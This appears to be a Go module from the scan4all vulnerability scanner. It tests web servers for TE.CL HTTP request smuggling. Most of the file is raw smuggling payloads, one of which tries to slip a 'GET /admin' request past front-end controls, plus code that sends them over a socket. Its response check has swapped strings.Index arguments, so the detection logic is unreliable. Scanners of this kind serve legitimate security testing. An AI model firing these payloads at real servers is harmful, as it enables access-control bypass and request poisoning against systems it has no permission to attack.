package Smuggling

import (
	"github.com/hktalent/scan4all/lib/socket"
	"strings"
)

var TeClPayload = []string{`POST / HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


`, `GET / HTTP/1.1
Host: %s
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Content-Length: 30


0


GET /admin HTTP/1.1

`}

func init() {
	for n, x := range TeClPayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		TeClPayload[n] = x
	}
}

type TeCl struct {
}

func (r *TeCl) CheckResponse(body string) bool {
	return "" != body && (-1 < strings.Index("Unrecognized method GPOST", body) || 3 < len(strings.Split(body, "HTTP/1.1")))
}

func (r *TeCl) GetPayloads() *[]string {
	return &TeClPayload
}

func (r *TeCl) Check(rc *socket.CheckTarget) {
	for _, x := range TeClPayload {
		s := rc.SendOnePayload(x, 1)
		if r.CheckResponse(s) {

			break
		}
	}
}
